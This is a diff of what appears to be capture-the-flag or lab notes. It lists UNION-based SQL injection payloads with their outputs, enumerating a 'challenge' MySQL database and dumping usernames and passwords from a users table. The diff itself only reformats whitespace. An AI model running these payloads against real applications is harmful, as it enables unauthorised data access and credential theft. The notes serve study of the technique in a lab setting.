@@ -83,41 +83,41 @@ UPDATE hostvulns SET tool="Nessus";
 
 # List all dbs.
 1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
-	information_schema
-	challenge
-	mysql
-	performance_schema
-	sys
+    information_schema
+    challenge
+    mysql
+    performance_schema
+    sys
 
 # List current db.
 1 UNION SELECT NULL,NULL,NULL,database()
-	challenge
+    challenge
 
 # List tables in the current db.
 1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
-	comments
-	users
+    comments
+    users
 
 # List column names in the table ‘comments’.
 1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
-	comments id
-	comments username
-	comments comment
-	comments post_date
+    comments id
+    comments username
+    comments comment
+    comments post_date
 
 # List all the data in comments.
 1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments
 
 # List column names in the table ‘users’.
 1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
-	users id
-	users username
-	users password
-	users is_admin
-	users signup_date
-	users USER
-	users CURRENT_CONNECTIONS
-        users TOTAL_CONNECTIONS
+    users id
+    users username
+    users password
+    users is_admin
+    users signup_date
+    users USER
+    users CURRENT_CONNECTIONS
+    users TOTAL_CONNECTIONS
 
 # List all the data in users.
 1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
